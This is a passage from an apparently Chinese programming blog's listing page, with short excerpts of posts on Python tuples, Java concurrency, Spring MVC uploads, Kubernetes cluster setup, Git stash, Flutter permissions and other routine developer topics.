可以看到，元组是 tuple 类型，这也是很多教程中用 tuple 指代元组的原因。
Python创建元组 Python 提供了两种创建元组的方法，下面一一进行介绍。
1) 使用 ( ) 直接创建
通过( )创建元组后，一般使用=将它赋值给某个变量，具体格式为：
tuplename = (element1, element2, ..., elementn)
其中，tuplename 表示变量名，element1 ~ elementn 表示元组的元素。
例如，下面的元组都是合法的：
num = (7, 14, 21, 28, 35) course = ("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37ab19d540948ee46e2fdbda1fc5c278/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7d17a6e1c6593be009a5e29c700fd67/" rel="bookmark">
			SW软件如果很卡，如何提升速度？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SW软件如果很卡，如何提升速度？ 在设计过程中，有时会发现装配体在装配中很卡，感觉电脑反射弧很长，这时候很容易让人心情烦躁，面对这样的问题，我们该如何解决呢？
1.首先打开一个装配体，点击齿轮一样的按钮“选项”
2.会弹出一个对话框选择性能。将使用软件OpenGL前面的勾去掉即可。
.如果OPENGL的选项框是灰色无法取消，该如何解决呢？
1.按下 win+R，输入regedit回车，打开注册表。
2.输入上图的路径
HKEY_CURRENT_USER\Software\SolidWorks\SolidWorks2010\Performance\Graphics\Hardware\Intel
选中右侧的Workarounds将值由 10 改为 9。这样再按照之前的操作，openGL选项就能改动了。但如果还是不行则可以直接将Workarounds改为4000000，这样就不需要之前的操作，这样等于直接将OPENGL断开运行。当你再打开装配体之后，发现不像之前那样卡了。
如果有啥问题可以在评论区提问，我会为大家逐一给与解答。欢迎大家评论。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/217bea1fa3d845c7d2b7717858509aa9/" rel="bookmark">
			有关vscode中pytorch中报错 No module named 问题（亲测有效！！！99%的其他文章无法解决）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有关vscode中pytorch中报错 No module named 问题 !!!注意本文只适用于在anaconda prompt中测试到torch的人 第一步
当在终端可以运行时，请在c,d,e任意盘中建立一个新的文件夹，然后将该文件夹拖动到vscode图标上打开
第二步
点击右键选择命令面板（或者按CTRL+SHRIFT+P）
第三步
选择Python解释器
第四步
选择你安装的pytorch的python
第五步
测试，在vscode中输入
import torch print(torch.__version__) 按F5，得到结果
这样就可以成功使用！本人亲测有效，好多文章都是千篇一律的复制，很烦人！！！
希望这篇文章能够真的帮助到你！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ad01856c074bd37365115580f641674/" rel="bookmark">
			书籍 - 《深入解析css》
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人评价：综合 9.2（准神书）
内容：9.8 （代码非常的详细，其中有一部分网址因为被限制了打不开，准确率基本100%）
排版文字章节：9.5（代码写的很详细，内容略长）
价格：9（139/382）
重读价值：9
本书主要讲的是css的基础知识，非常全面，以及项目应用css的一些知识
本书目录：
1.层叠、优先级和继承
2.相对单位
3.盒模型
4.理解浮动
5.Flexbox
6.网格布局
7.定位和层叠上下文
8.响应式设计
9.模块化css
10.模式库
11.背景、阴影和混合模式
12.对比、颜色和间距
13.排版
14.过渡
15.变换
16.动画
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d883c90072cc441841682c856548f8ce/" rel="bookmark">
			黑马并发编程JUC总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		并发编程总结1 并发编程2.进程和线程2.1定义2.2并发和并行2.3应用异步调用并发应用 3.java线程3.1线程创建创建线程方法1创建方法2Thread和Runable的区别创建方法3 3.2线程运行3.3线程运行线程的栈线程上下文切换常见方法startrunsleepinterruptyieldsetPriorityjoininterrupt两阶段终止模式LockSupport 3.4主线程和守护线程3.5线程5种状态3.6线程的六种状态3.7烧水泡茶案例join思路 4.并发之共享模型4.1多线程带来的共享问题问题分析临界区竞态条件 4.2解决方案①synchronize思考面向对象改进 4.3方法中的synchronize线程八锁 4.4变量的线程安全分析静态变量和成员变量是否有线程安全问题？局部变量？线程安全类不可变类线程安全String 实例分析 4.5习题卖票问题转账问题 4.6MonitorJAVA对象头Monitor锁工作原理字节码角度 4.7synchronize优化小故事1.轻量级锁2.锁膨胀3.自旋优化4.偏向锁批量重偏向批量撤销 5.锁消除 4.8wait和notify小故事Blocked和Waiting区别wait和notify的规则 4.9sleep和wait区别正确使用同步保护性暂停join的源码Future 异步生产者/消费者模型定义 4.10park和unpark4.11重新理解线程状态情况1：new-&gt;runnable情况2：runnable-&gt;waiting情况3情况4情况5-8情况9情况10 4.12多把锁死锁的案例活锁饥饿问题 4.13ReentrantLock可重入可中断超时解决哲学家的问题条件变量用锁来固定顺序执行轮流打印abc的思路(交替执行)synchronized方式ReentrantLock处理顺序执行问题思路LockSupport执行思路 第四章思维导图 5.共享模型之内存5.1JMM内存抽象模型5.2可见性出现的问题解决方案两阶段终止思路Balking模式 5.3指令重排优化为什么要指令重排？诡异的结果解决volatile原理双重检查双重检查的问题根源分析（dcl） happen-before（可见性）习题balking习题单例 6.共享模型之无锁6.1提出问题6.2CAS和volatileCASCAS-volatile为什么无锁的效率更高CAS的特点 6.3原子整数AtomicIntegerapi模仿updateAndGet 6.4原子引用AtomicReferenceABA问题解决方案AtomicStampedReferenceAtomicMarkableReference 6.5原子数组AtomicIntegerArray 6.6原子更新器AtomicReferenceUpdater 6.7原子累加器LongAdderCAS实现锁的原理缓存伪共享LongAdder源码add部分longAccumulate 6.8Unsafe作用使用案例 思维导图 7.并发模型之不可变7.1日期转换问题SimpleDateFormat和DateTimeFormatter 7.2String7.3享元模式作用 7.4自定义连接池7.5final的原理设置的原理优化原理第七章思维导图 并发编程 （图片来源黑马JUC教程）
2.进程和线程 2.1定义 进程：资源分配最小的单位，主要就是线程的容器。运行的程序，负责管理IO和内存，以及指令的执行
线程：其实就是指令流，进程的子集，进程可以分多个线程运行。
区别：
进程是最小资源分配，线程是最小调度（指的是cpu切换指令流执行的调度）线程是进程的子集同样的计算机里面进程通讯是IPC方式，不同计算机就要通过协议比如HTTP线程切换的成本更低，比如CPU需要并发执行进程或者是线程那么线程比较轻量切换消耗CPU时间也更小。 2.2并发和并行 定义
并发：cpu同时执行多个线程，交替执行。好比打扫一会就去洗洗厕所
并行：多个cpu执行多个线程。多个饭煲一起煮饭的意思
2.3应用 异步调用 其实就是在一个程序执行的时候，一段指令流需要阻塞或者是IO操作，那么完全可以开一个线程来异步执行这段指令流。而不是一个进程完成所有的指令处理。
常用在视频格式转换 并发应用 并发不一定能够提升效率，反而在来回切换的时候浪费了资源和时间。有的任务也不适合切分，主要还是看任务的执行目标
3.java线程 3.1线程创建 创建线程方法1 Thread重写run方法
@Slf4j(topic = "c.MyTest1") public class MyTest1 { public static void main(String[] args) { Thread t=new Thread(){ @Override public void run() { log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d883c90072cc441841682c856548f8ce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df0ac73aa8ce7ce8ec5479751ed0c7b5/" rel="bookmark">
			计算机基础知识——海明码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		海明码 校验位位数的确定校验码的位置校验码生成过程求取p举例 校验位位数的确定 设数据位有m（message）位，校验位有p(parity)位，则校验码一共有2^p种取值，其中只有一种取值是正确的，所以为了保证校验和对错误数据的修改，必须满足：
2^p-1 &gt;= m + p
解释：右侧是传输数据的总位数（由于校验码也进行传输，所以也有可能出错）。
校验码的位置 按照规定校验码应该放在2^n(n=0,1, 2…)位置上
校验码生成过程 假设要传输的数据是1010，m=4, p=3
位数(二进制编号)1(001)2(010)3(011)4(100)5(101)6(110)7(111)位数对应的编码p1p21p3010 从表中可以看到由于校验码p的位数总是处于2的整数倍，所以其位数对应的二进制编码只有一位为1，其余全是0，这也说明任何位数都可以由p表示。
求取p 要求p首先需要校验位和信息位建立关系
第三位为1p1(001)m3(011)m5(101)m7(111)第二位为1p2(010)m3(011)m6(110)m7(111)第一位为1p3(100)m5(101)m6(110)m7(111) 代入数据1010
校验位奇校验偶校验---p1(001)01100p2(010)10110p3(100)01010 这里说的奇校验和偶校验指的是校验位和信息位关系的二进制编码1的个数加一后为奇数还是偶数。
举例 假设发射端分别发射了奇校验的海明码（确保发射时码一定是正确的）
奇0110010 假设接收端收到的奇校验数据为
-1234567奇0110110 e1p1m3m5m7e2p2m3m6m7e3p3m5m6m7 带入数据
e10110e21110e30110 按照奇校验规则
e3e2e1101 说明第五位出错了，正确的二进制数应该为
-1234567奇0110010 如果没有出错e3,e2,e1应该全是0
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31b071f97d843a53004f64c5482395fa/" rel="bookmark">
			2021-10-16【严蔚敏数据结构代码实现合集】【c语言学习必备】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本文记录了我为期三个月《算法与数据结构》的学习历程，仅作为记录自己学习状态的文章。 线性表 2021-9-14【数据结构/严蔚敏】【顺序表】【代码实现算法2.1-2.7】2021-9-18【数据结构/严蔚敏】【单链表】【代码实现算法2.8-2.12】2021-9-18【数据结构/严蔚敏】【静态链表】【代码实现算法2.13-2.17】2021-9-19【数据结构/严蔚敏】【双向链表】【代码实现算法2.18-2.19】2021-9-19【数据结构/严蔚敏】【带头结点的线性表】【代码实现算法2.20-2.21】2021-9-19【数据结构/严蔚敏】【一元多项式的表示及相加、相减、相乘】【代码实现算法2.22-2.23】2021-9-23【数据结构】【单链表逆置】2021-9-23【数据结构】【顺序表逆置】 栈&amp;队列 2021-9-22【数据结构/严蔚敏】【顺序栈&amp;链式栈&amp;迷宫求解&amp;表达式求值】【代码实现算法3.1-3.5】2021-9-27【数据结构/严蔚敏】【链队列】2021-9-28【数据结构/严蔚敏】【循环队列】 串 2021-10-5【数据结构/严蔚敏】【串的定长顺序存储表示】【代码实现算法4.1-4.3实现】2021-10-5【数据结构/严蔚敏】【串的堆分配存储表示】【代码实现算法4.4实现】 二叉树 2021-10-15【数据结构/严蔚敏】【二叉树基本实现】2021-10-15【数据结构/严蔚敏】【二叉树的前/中/后/递归/非递归遍历&amp;层序遍历】【代码实现算法6.1-6.4】2021-10-15【数据结构/严蔚敏】【线索二叉树】【代码实现算法6.5-6.7】2021-10-27【数据结构/严蔚敏】【哈夫曼树&amp;哈夫曼编码】【代码实现算法6.12-6.13】 图 2021-11-18【数据结构/严蔚敏】【邻接矩阵&amp;图&amp;DFS&amp;BFS】【代码实现算法7.1-7.6】2021-11-23【数据结构/严蔚敏】【邻接表&amp;图&amp;DFS&amp;BFS】【代码实现算法7.1-7.6】2021-11-23【数据结构/严蔚敏】【无向图的联通分量和生成树】【代码实现算法7.7-7.8】2021-11-23【数据结构/严蔚敏】【最小生成树：普里姆( Prim )算法/克鲁斯卡尔( Kruskal )算法】【代码实现算法7.7-7.8】2021-11-25【数据结构/严蔚敏】【关节点&amp;重连通分量】【代码实现算法7.10-7.11】2021-11-25【数据结构/严蔚敏】【拓扑排序】【代码实现算法7.12】2021-11-26【数据结构/严蔚敏】【关键路径】【代码实现算法7.13-7.14】2021-11-25【数据结构/严蔚敏】【Dijkstra】【代码实现算法7.15】2021-12-3【数据结构/严蔚敏】【弗洛伊德（Floyd）】【代码实现算法7.16】 练习题 2021-10-31【数据结构练习题】【删除表中值大于min且小于max的节点】2021-10-31【数据结构练习题】【删除结点*s的直接前驱】2021-11-24【数据结构练习题】【二叉搜索树的插入&amp;删除】 平时实验报告 2021-11-9【数据结构平时实验】【线性表&amp;栈和队列】
2021-12-11 【数据结构平时实验】【树】2021-12-11 【数据结构平时实验】【图】 课程设计 2021-12-23【数据结构课程设计】【关键路径】 历时三个月，数据结构基础课完美撒花，但是数据结构的学习才刚刚开始！！！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60430f76163c530878b0e95b2bfda9f6/" rel="bookmark">
			springmvc的文件上传和下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、添加相关配置1、在pom.xml中添加文件上传相关依赖2、配置文件上传解析器(CommonsMultipartResolver)，加在spring-mvc.xml配置文件中的最后(默认是叫springmvc-servlet.xml) 二、相关代码1、参考的数据库表t_file2.实体类File.java3.DAO层FileMapper.java（这里上传主要用到了insert方法）4.DAO层映射文件FileMapper.xml5.service层接口IFileService.java6.service层接口实现类FileServiceImpl.java7.junit测试公用类BaseTestCace.java8.service层接口实现类junit测试类FileServiceImplTest.java9.控制层FileController.java10.视图层index.jsp11.视图层upload.jsp12.视图层success.jsp13.效果图参考 总结 前言 本篇文章主要介绍ssm框架中springmvc的文件上传和下载，上传就是将需要的文件上传到指定目录并将文件信息保存到数据库，下载即到指定目录下载已上传的文件
提示：以下是本篇文章正文内容，下面案例可供参考
一、添加相关配置 1、在pom.xml中添加文件上传相关依赖 &lt;dependency&gt; &lt;groupId&gt;commons-fileupload&lt;/groupId&gt; &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt; &lt;version&gt;1.3.3&lt;/version&gt; &lt;/dependency&gt; 2、配置文件上传解析器(CommonsMultipartResolver)，加在spring-mvc.xml配置文件中的最后(默认是叫springmvc-servlet.xml) &lt;bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver"&gt; &lt;!-- 必须和用户JSP 的pageEncoding属性一致，以便正确解析表单的内容 --&gt; &lt;property name="defaultEncoding" value="UTF-8"&gt;&lt;/property&gt; &lt;!-- 文件最大大小(字节) 1024*1024*50=50M--&gt; &lt;property name="maxUploadSize" value="52428800"&gt;&lt;/property&gt; &lt;!--resolveLazily属性启用是为了推迟文件解析，以便捕获文件大小异常--&gt; &lt;property name="resolveLazily" value="true"/&gt; &lt;/bean&gt; 二、相关代码 1、参考的数据库表t_file create table t_file ( file_id varchar(32) primary key, real_name varchar(50) not null, content_type varchar(50) not null, url varchar(256) not null, update_datetime timestamp NULL default CURRENT_TIMESTAMP -- insert=false ); 2.实体类File.java package com.zking.ssm.model; import lombok.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60430f76163c530878b0e95b2bfda9f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4c09d6663cc249a85683b32edb05f0e/" rel="bookmark">
			IDEA切换主题(换背景颜色)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		友友们,干货来啦!!!! 1.File---&gt;Setting
2.点击Setting后出现以下页面!
(1)IDEA一共有三种主题的哈!小编这里用的是IntelliJ,简约白色啦!!
(2)这个是Darcula的主题效果
(3)High contrast的主题效果
这样操作,友友们就可以选择自己喜欢的主题啦!!!!(选择好以后记得点击ok保存哦!!!)
(小编也在努力学习更多哟!以后会多多分享哒!)
希望对友友们有所帮助!!!!
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29b60236d27af93c3d68b61cd74f8371/" rel="bookmark">
			网络IP地址管理的重要性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在企业网内部，最常见的故障是网络中断，客户端无法开展工作，这大部分跟IP地址有关系。如果是客户端设置不正确，很有可能引起网络的不正常，甚至关系到服务器的安全正常的工作，最严重的后果就是网络崩溃。在基本TCP/IP协议的网络里，每台机器要有IP地址才能正常工作，可见正确安全的使用IP地址很重要。
随着信息化的发展，企业内部的网络规模逐渐的扩大，网络遍及每个角落，每连一台设备都要分配一个IP地址，非常容易引起IP地址的冲突，及其修改了IP地址后引起的路由的改变，引发更大规模的网络故障。
当网络中存在这类故障时，网络效率极速下降，客户端不断发包，造成网络拥堵，从而引发不明原因的故障，给网络管理员解决问题增加了难度，相应的延误时间，带来经济上的的损失。引起这种故障主要有以下几点：
1、客户端的修改，包括用户的无意的修改和恶意占用别人的IP地址，这种情况很普遍。
2、网络管理员的失误，包括维修时的临时IP，分配设置参数的错误。
3、网络设计时的考虑不周，主要是IP地址不够用，这种情况很少见，通常出现在网络升级前。
4、网络广播，当病毒出现在企业内网时，这种现象开始出现。
当前普遍的作法，就是手动分配网络地址，划分VLAN，邦定MAC地址等方法。结合这几种方法，对自己的网络进行有针对性的改造。其实主要还是预防为主，解决问题为辅，把故障消灭在源头。
预防不过是把方法用好而已，做到计算机名称，IP地址，MAC地址的严格对应，根据需要对其计算机的上述信息及相关设置进行登记，做到一机一号严格对应。从根源上度绝IP混乱，也为出问题快速的定位故障提供依据。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2012c04abf033a03431d71b42c388a70/" rel="bookmark">
			android NDK JNI配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		android NDK JNI配置 ！！！！！！！！！！！！！！！！！！！
首先配置好android SDK 以及JNI
使用编译器android sudo
！！！！！！！！！！！！！！！！！！！
新建项目-基础配置阶段一 新建项目 选择project视图
新建JNI
在文件夹中创建一个Android.mk文件 （就是jni所在路径的makefile）写入一下内容
LOCAL_PATH:=$(call my-dir) include $(CLEAR_VARS) #libtestjni.so LOCAL_MODULE := testjni LOCAL_SRC_FILES := test.cpp LOCAL_LDLIBS := -llog include $(BUILD_SHARED_LIBRARY) 在app的build.gradle中的android 范围内加入
sourceSets { main.jniLibs { //表示生产的so文件所在路径在什么位置 source { srcDirs = ['../libs'] } } } 删除 main { jni.srcDirs = [‘src/main/jni’, ‘…/JNI/’] }
在JNI中创建一个test.cpp
void testJni_Hello() { return; } 使用Windows PowerShell （win10自带工具）
cd JNI目录
ndk-build.cmd
运行示例：
PS C:\Users\Daidenghui&gt; cd E:\02course\MyApplication\MyApplication09\JNI
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2012c04abf033a03431d71b42c388a70/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a539c05414034a288509e6739dc4174/" rel="bookmark">
			Git Pull Failed 原因和解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Git Pull Failed 原因和解决办法 原因：
先说一下Git和SVN的区别吧，有助于更好的理解这个问题。
SVN从服务器上update文件时，如果文件有冲突，SVN会自动帮你merge，很方便；GIT如果本地有文件改动未提交，且该文件和服务器最新版本有冲突，pull更新时会提示错误，无法更新。
这个小小的区别，就是造成了产生“Git Pull Failed”错误的根本原因 。 解决办法：
Git编译器，要么先commit自己的改动再pull（简单不介绍了），要么使用Stash Changes后再pull，如下。
当本地改动后，可以项目名称上右键 --&gt; Git --&gt; Repository --&gt; Stash Changes --&gt; Create Stash，将本地的全部改动临时保存到本地仓库，并撤销了本地的所有改动； 2. 然后点击 Pull，这样就讲本地的代码更新到最新了；
3. 最后再点击 UnStash Changes --&gt; Pop Stash ，这样就将之前的改动合并到本地；
4.如果步骤3有冲突，自己手动修改即可。
Stash Changes的好处：
stash可以先将你的改动暂存到本地仓库中，随时可以取出来再用，但是不用担心下次push到服务器时，把不想提交的改动也push到服务器上，因为Stash Changes的内容不参与commit和push。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a3f71e74350758b9288185d367c4e85/" rel="bookmark">
			如何申请Office 365 E5开发者账号，开通OneDrive 5T空间教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人免费版OneDrive只有5G空间，而Office 365 E5账号的OneDrive有5T存储空间，且可以开通25个每个5T空间的子号，并可激活Office 365使用。
不过，Office 365 E5只有90天的试用期，如果到时候无法续期，则OneDrive也会被停止使用。
申请及使用方法：
1、浏览器打开网址：https://developer.microsoft.com/zh-cn/office/dev-program，新注册账号或用已有的微软账号登录，手机接收验证码即可完成注册。
2、注册完成后，登录管理地址：https://portal.office.com/AdminPortal/Home，可进行新建子用户、分配Office 365订阅等。
3、管理员账号登录OneDrive后，默认空间为1T，可以打开网址：https://admin.onedrive.com/#v=StorageSettings，修改为5T，可以在OneDrive首页界面右上角点击设置图标-OneDrive设置，在新页面左侧点击其他设置-存储标准，查看5T空间是否生效。
4、如果上述设置5T空间无法生效，则需要安装SharePoint Online Management Shell工具来设置，下载地址：https://www.microsoft.com/zh-CN/download/details.aspx?id=35588，安装完成后运行工具，执行以下命令：
Connect-SPOService -Url https://&lt;span style="color: blue;"&gt;imyours&lt;/span&gt;-admin.sharepoint.com 其中，蓝色imyours是我账号组织名字，此次需要修改为你自己的。然后按提示输入管理员账号和密码登录。
接着再执行命令：
Set-SPOSite -Identity https://&lt;span style="color: blue;"&gt;imyours&lt;/span&gt;-my.sharepoint.com/personal/&lt;span style="color: red;"&gt;yours_imyours_onmicrosoft_com&lt;/span&gt; -StorageQuota 5242880 蓝色处修改为你的组织名字，红色修改为你的管理员名字，比如，我的管理员账号为：yours@imyours.onmicrosoft.com，则名字为：yours_imyours_onmicrosoft_com。
执行之后，刷新一下OneDrive页面就可以看到5T空间生效了。
说在最后，由于Office 365 E5只有90天的试用期，建议每个月都登录OneDrive进行使用，这样在账号快到期时，就会自动续期了。声明：本站所发布的任何文章/源码/工具/资源仅限参考用于网络安全技术研究/预警/商用/学习使用,参考中严禁出现公民个人信息,任何操作请遵循国家相关法律法规！禁止将在本站学习到相关技术应用到不正当途径，因使用技术导致滥用、泄露等产生的风险与本站无关!‘
本文已被扣扣技术网授权
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43735c17989b62ac520f055596de59a1/" rel="bookmark">
			k8s的初始及搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		(kubernetes)k8s 1.初识k8s 1.1.k8s是什么？ ​ kubernetes，简称K8s，是用8代替8个字符“ubernete”而成的缩写。是一个开源的，由go语言开发，用于管理云平台中多个主机上的容器化的应用，Kubernetes的目标是让部署容器化的应用简单并且高效（powerful）,Kubernetes提供了应用部署，规划，更新，维护的一种机制。
k8s是一种容器的管理，规划，扩展的技术。
1.2.环境搭建 部署Kubernetes环境（集群）主要有多种方式:
minikube(用的不多)
minikube可以在本地运行Kubernetes的工具，minikube可以在个人计算机(包括 Windows ,macOS和Linux PC)上运行一个单节点Kubernetes集群，
以便您可以试用Kubernetes或进行日常开发工作，不可以用于生产。
网页内操作（一般用于测试代码）：https://kubernetes.io/zh/docs/tutorials/hello-minikube/
kind（用的不多）
Kind和minikube类似的工具，让你在本地计算机上运行Kubernetes,此工具需要安装并配置Docker ;
详细：https://kind.sigs.k8s.io/ （没有远程操作）
kubeadm(常用)
Kubeadm是一个K8s部署工具，提供kubeadm init和 kubeadm join两个操作命令，可以快速部署一个Kubernetes集群;可以用于生产
https://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm/https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/
二进制包(适用于老手)
从Github下载发行版的二进制包，手动部署安装每个组件，组成Kubernetes集群，步骤比较繁琐,r但是能让你对各个组件有更清晰的认识
yum安装(版本太老)
通过yum安装Kubernetes的每个组件，组成Kubernetes集群，不过yum源里面的k8s版本已经比较老的，所以这种方式用得也比较少了
第三方工具
有一些大神封装了一些工具，利用这些工具进行k8s 环境的安装
花钱购买
直接购买类似阿里云这样的公有云平台k8s，一键搞定;
1.3.用kubeadm部署k8s kubeadm是官方社区推出的一个用于快速部署kubernetes集群的工具这工具能通过两条指令完成一个kubernetes集群的部署;
1、创建一个Master节点∶
kubeadm init 2、将Node节点加入到 Master集群中∶
$ kubeadm join &lt;Master 节点的IP和端口&gt; 配置要求：
(1)一台或多台机器，操作系统CentOS 7.x-86_x64
(2）硬件配置:内存2GB或2G+，CPU 2核或CPU2核+;( 3)集群内各个机器之间能相互通信;
(4）集群内各个机器可以访问外网，需要拉取镜像;( 5）禁止swap分区;
为了方便我们在xshell里开启全部会话： 查看 &gt; 攥写 &gt; 攥写 &gt; 左下方图标 &gt; 全部会话
这样，我们在底下编写命令，上面所有会话都执行。
对master和node都设置 #1.关闭防火墙 systemctl stop firewalld systemctl disable firewalld #或者设置空规则 systemctl stop firewalld &amp;&amp; systemctl disable firewalld yum -y install iptables-services &amp;&amp; systemctl start iptables &amp;&amp; systemctl enable iptables &amp;&amp; iptables -F &amp;&amp; service iptables save #关闭selinux setenforce 0 #临时 sed -i 's/enforcing/disabled/ ' /etc/selinux/config #永久 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43735c17989b62ac520f055596de59a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/704605c3194f28eb8524b21f02b38e84/" rel="bookmark">
			Flutter 使用permission_handler 申请权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近Flutter项目中需要使用到高德定位，需要申请定位权限，在这里使用到了permission_handler 。遇到了一些问题记录一下（以定位权限为例）。
获取插件
在 pubspec.yaml 文件配置 dependencies: permission_handler: ^8.2.5 permission_handler | Flutter Package配置权限信息
在Info.plist 文件配置 &lt;key&gt;NSLocationAlwaysAndWhenInUseUsageDescription&lt;/key&gt; &lt;string&gt;运单打卡需要获取您的位置信息&lt;/string&gt; &lt;key&gt;NSLocationAlwaysUsageDescription&lt;/key&gt; &lt;string&gt;运单打卡需要获取您的位置信息&lt;/string&gt; &lt;key&gt;NSLocationUsageDescription&lt;/key&gt; &lt;string&gt;运单打卡需要获取您的位置信息&lt;/string&gt; &lt;key&gt;NSLocationWhenInUseUsageDescription&lt;/key&gt; &lt;string&gt;运单打卡需要获取您的位置信息&lt;/string&gt; 在Podfile文件配置（这一点要注意）
post_install do |installer| installer.pods_project.targets.each do |target| flutter_additional_ios_build_settings(target) target.build_configurations.each do |config| # You can remove unused permissions here # for more infomation: https://github.com/BaseflowIT/flutter-permission-handler/blob/master/permission_handler/ios/Classes/PermissionHandlerEnums.h # e.g. when you don't need camera permission, just add 'PERMISSION_CAMERA=0' config.build_settings['GCC_PREPROCESSOR_DEFINITIONS'] ||= [ '$(inherited)', ## dart: [PermissionGroup.location, PermissionGroup.locationAlways, PermissionGroup.locationWhenInUse] 'PERMISSION_LOCATION=1', ] end end end 调用申请权限
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/704605c3194f28eb8524b21f02b38e84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eee800142c68ca6320d5c50d77b98a53/" rel="bookmark">
			Java新手入门值得看的五本书！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 很多知识都可以通过书本学习，Java学习也需要书籍，尤其是对于Java初学者和Java自学者来说尤为重要，选择了好了配套书籍在自学的路上可以达到事半功倍的效果，下面为Java初学和自学的朋友推荐几本合适的书籍希望对大家有所帮助。
1、《Java学习笔记》
此书的特点在于里面有很多作者对Java语言的独有的理解与讲解，这些内容往往也是所有Java语言初学者迷惑的地方。称之为超简明入门书籍也不为过。
2、《Java从入门到精通》
作为一本Java技术的入门书，它是绝对出色的。语言通俗易懂，一个星期就能让你明白怎么用Java语言写程序。此书对于没有任何编程语言基础的同学非常友好，一步一步带领入门。
3、《Head First Java》
如果你是个讨厌读书的人，那么这本书一定会让你觉得很有趣！这本书，通俗易懂，重点突出的书，相当适合初学者快速入门，缺点是段子太多，有时候会被当成笑话书来看。
4、《Java编程思想》
在有了一定的Java编程经验之后，你需要“知其所以然”了。这个时候《Java编程思想》是一本让你知其所以然的好书，它 对于基本的面向对象知识有比较清楚的交待，对Java基本语法，基本类库有比较清楚的讲解，可以帮你打一个良好的Java编程基础。这本书的缺点是实在太 厚，也比较罗嗦，不适合现代人快节奏学习，因此看这本书要懂得取舍，不是每章每节都值得一看的，挑重点的深入看就可以了。
5、《重构 改善既有代码的设计》
这本书名气很大，不用多介绍，可以在闲暇的时候多翻翻，多和自己的实践相互印证。这本书对产生影响是潜移默化的。
学习不要走马观花的学，这里也希望大家最终都能够学有所成，学习编程不是一天两天的功夫，勤能补拙才是硬道理，祝大家最终都能成为一名合适开发工程师。
如果你想更系统的学习Java的话，你可以看下高淇老师主讲的Java300集视频，里面非常详细的讲解了Java基础到进阶非常的详细！ Java300集零基础新手入门 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c3106275d928cbf4864e39e42107c2c/" rel="bookmark">
			django.core.exceptions.ImproperlyConfigured: Error loading MySQLdb module. Did you install mysqlclie
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 解决办法一：
1、安装pymysql
pip install pymysql 2、在根目录的__init__.py文件里加下面两行代码：
import pymysql pymysql.install_as_MySQLdb() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7d1ccf772ec3c681df01ea2de9d7a48/" rel="bookmark">
			vue.js与vue.runtime.js区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.两个版本分别叫什么 vue.js：完整版
vue.runtime.js:只包含运行时版
